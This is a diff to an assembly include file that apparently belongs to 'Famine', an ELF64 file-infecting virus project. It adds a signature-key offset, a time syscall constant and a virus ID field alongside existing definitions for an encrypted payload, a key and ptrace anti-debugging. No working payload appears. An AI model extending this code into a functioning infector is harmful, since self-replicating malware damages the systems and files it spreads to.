@@ -1,8 +1,9 @@
 %define PROG_SIZE               _end - main
 %define JMP_OFFSET              jump - main
-%define SIGNATURE_SIZE          _end - signature
+%define SIGNATURE_SIZE          signature_end - signature
 %define KEY_SIZE                signature - key
 %define KEY_OFFSET              key - main
+%define SIGNATURE_KEY_OFFSET    signature_key - main
 %define ENCRYPT_SIZE            key - encrypted_start
 %define ENCRYPT_OFFSET          encrypted_start - main
 %define DECRYPT_KEY_OFFSET      key - decrypte
@@ -51,6 +52,7 @@
 %define SYS_GETDENTS    78
 %define SYS_PTRACE      101
 %define SYS_SETSID      112
+%define SYS_TIME        201
 %define SYS_GETRANDOM   318
 
 struc   Elf64_Ehdr
@@ -113,5 +115,7 @@ struc famine
     entry:      resq 1
     oldEntry:   resq 1
     programStart: resq 1
+    virusId:    resq 1
+
     fileName: resb PATH_BUFF_SIZE
 endstruc
